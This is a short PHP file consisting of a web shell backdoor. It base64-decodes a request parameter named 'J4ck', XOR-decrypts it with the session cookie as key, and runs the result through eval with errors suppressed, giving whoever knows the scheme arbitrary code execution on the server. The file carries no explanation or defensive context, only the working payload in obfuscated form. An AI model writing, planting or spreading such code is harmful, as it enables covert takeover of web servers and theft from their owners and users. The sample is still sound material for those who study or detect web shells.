<?php
@$post=base64_decode($_REQUEST['J4ck']);$key=@$_COOKIE['PHPSESSID'];for($i=0;$i<strlen($post);$i++){$post[$i] = $post[$i] ^ $key[$i%26];}@eval($post);
?>
